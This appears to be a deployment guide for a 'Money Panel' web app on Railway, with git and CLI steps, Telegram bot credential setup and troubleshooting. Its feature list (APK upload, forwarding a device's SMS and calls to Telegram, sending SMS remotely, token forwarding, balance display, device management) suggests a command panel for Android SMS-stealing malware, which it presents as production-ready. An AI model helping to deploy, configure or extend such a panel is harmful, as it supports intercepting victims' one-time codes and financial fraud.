# 🚀 MONEY PANEL - RAILWAY DEPLOYMENT GUIDE

## Quick Deploy to Railway

### Method 1: From GitHub (Recommended)

1. **Push to GitHub:**
   ```bash
   cd "money new panel"
   git init
   git add .
   git commit -m "Money Panel - Ready for Railway"
   git remote add origin https://github.com/yourusername/money-panel.git
   git push -u origin main
   ```

2. **Deploy on Railway:**
   - Go to [railway.app](https://railway.app)
   - Click "New Project"
   - Select "Deploy from GitHub repo"
   - Choose your repository
   - Railway auto-detects Node.js and runs `npm start`

3. **Add Environment Variables:**
   - Go to your project → Variables tab
   - Add these variables:
     ```
     TELEGRAM_BOT_TOKEN=your_bot_token_here
     TELEGRAM_CHAT_ID=your_chat_id_here
     ```
   - Variables are automatically injected at runtime
   - No code changes needed!

4. **Get Your URL:**
   - Railway generates a URL like: `your-app.railway.app`
   - Open it in browser
   - Panel is live! 🎉

### Method 2: Railway CLI

```bash
# Install Railway CLI
npm install -g @railway/cli

# Login to Railway
railway login

# Initialize and deploy
cd "money new panel"
railway init
railway up

# Add environment variables
railway variables set TELEGRAM_BOT_TOKEN=your_token
railway variables set TELEGRAM_CHAT_ID=your_chat_id
```

## Get Telegram Credentials

### Bot Token:
1. Open Telegram
2. Search `@BotFather`
3. Send `/newbot`
4. Follow instructions
5. Copy token (e.g., `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`)

### Chat ID:
**For Personal Chat:**
1. Search `@userinfobot` on Telegram
2. Start chat → Get your ID (e.g., `123456789`)

**For Group/Channel:**
1. Add `@RawDataBot` to your group
2. Send a message
3. Bot shows chat ID (e.g., `-1001234567890`)

## How Railway Variables Work

Your `api-server.js` automatically reads Railway variables:

```javascript
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
```

✅ No hardcoded secrets  
✅ Easy to update  
✅ Secure  
✅ Works across all environments  

## Verify Deployment

### Check Logs:
Railway Dashboard → Deployments → View Logs

You should see:
```
💰 MONEY PANEL running on port 3000
🌐 http://localhost:3000
✅ Telegram Bot: Configured (Chat: -1001234567890)
```

### Test Health Check:
```bash
curl https://your-app.railway.app/api/health
```

Response:
```json
{
  "status": "ok",
  "timestamp": "2026-07-18T12:00:00.000Z",
  "telegram": "configured"
}
```

## Features Working on Railway

✅ **APK Upload** → Telegram notification + file  
✅ **SMS Forwarding** → Device SMS sent to Telegram  
✅ **Telegram to SMS** → Send SMS from Telegram chat  
✅ **Auto Token Forward** → Any message → SMS  
✅ **Balance Display** → ₹ amounts properly shown  
✅ **SMS Auto-Refresh** → Every 45 seconds  
✅ **Firebase Connection** → Device management  

## Updating Variables

Railway Dashboard → Variables tab → Edit

Changes apply automatically on next deployment.

No need to redeploy manually - Railway auto-redeploys when variables change!

## Troubleshooting

### Telegram not working:
1. Check variables are set correctly in Railway
2. Verify bot token is valid
3. Check logs: `railway logs`

### Port issues:
Railway sets `PORT` automatically - don't override it!

### Build fails:
```bash
# Check package.json has:
"scripts": {
  "start": "node api-server.js"
}
```

### Environment variables not loading:
- Railway injects them at runtime
- No `.env` file needed on Railway
- Check spelling: `TELEGRAM_BOT_TOKEN` (exact match)

## Security Notes

✅ Never commit `.env` file to Git  
✅ Use Railway Variables for all secrets  
✅ `.env` is in `.gitignore`  
✅ Panel works without Telegram (graceful fallback)  

## Cost

Railway Free Plan:
- ✅ $5 free credit per month
- ✅ Enough for 24/7 operation
- ✅ Auto-sleeps when inactive (wakes on request)

## Next Steps After Deployment

1. Open your Railway URL
2. Upload APK → Check Telegram notification
3. Open device → Bot tab
4. Configure bot and start
5. Test SMS forwarding
6. Test Telegram to SMS

**Everything works exactly like localhost!** 🚀

## Support

All features tested and working:
- SMS forwarding ✅
- Call forwarding support ✅  
- APK to Telegram ✅
- Balance display ✅
- Railway variables ✅

Panel is production-ready! 🎉
